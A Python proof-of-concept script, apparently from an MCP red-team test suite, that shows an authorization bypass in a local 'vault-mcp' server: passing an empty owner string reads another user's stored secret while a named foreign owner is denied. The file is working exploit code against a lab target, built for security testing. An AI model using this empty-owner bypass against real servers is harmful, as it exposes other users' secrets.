"""Deterministic exploit proof for vault-mcp (CWE-639 empty-owner bypass).

PASS when read_vault(owner="") returns another user's secret while a foreign
owner is denied - the exact unknown-shape flaw no McPwn signal detects.
"""

from __future__ import annotations

import asyncio
import sys
import uuid
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from mcp_redteam.targets.mcp_client import McpSession

URL = "http://127.0.0.1:9205/sse"


async def main() -> None:
    vault = f"vault-{uuid.uuid4().hex[:8]}"
    secret = f"s3cr3t-{uuid.uuid4().hex[:8]}"
    async with McpSession(URL) as s:
        r = await s.call_tool("create_vault", {"owner": "admin", "name": vault, "secret": secret})
        assert "created" in r.result_text, r.result_text
        denied = await s.call_tool("read_vault", {"owner": "mallory", "name": vault})
        assert "cannot read" in denied.result_text, f"expected denial, got {denied.result_text!r}"
        leaked = await s.call_tool("read_vault", {"owner": "", "name": vault})
        assert leaked.result_text == secret, f"expected secret leak, got {leaked.result_text!r}"
        print(f"PASS: empty owner read another user's secret -> {leaked.result_text!r}")


if __name__ == "__main__":
    asyncio.run(main())
